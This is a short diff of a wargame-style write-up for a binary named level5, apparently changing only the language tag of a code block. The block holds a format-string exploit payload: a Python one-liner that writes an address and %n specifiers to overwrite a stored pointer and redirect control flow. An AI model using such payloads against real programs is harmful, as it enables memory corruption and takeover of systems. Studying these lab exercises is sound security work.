@@ -72,6 +72,6 @@ If we overwrite the value stored at address `0x8049838`, we can redirect control
 
 By using techniques shown in previous write-up, we end up with the following payload :
 
-```
+```bash
 (python -c 'print("\x38\x98\x04\x08" + "%08x.%08x.%0134513808x.%n")'; cat) | ./level5
 ```
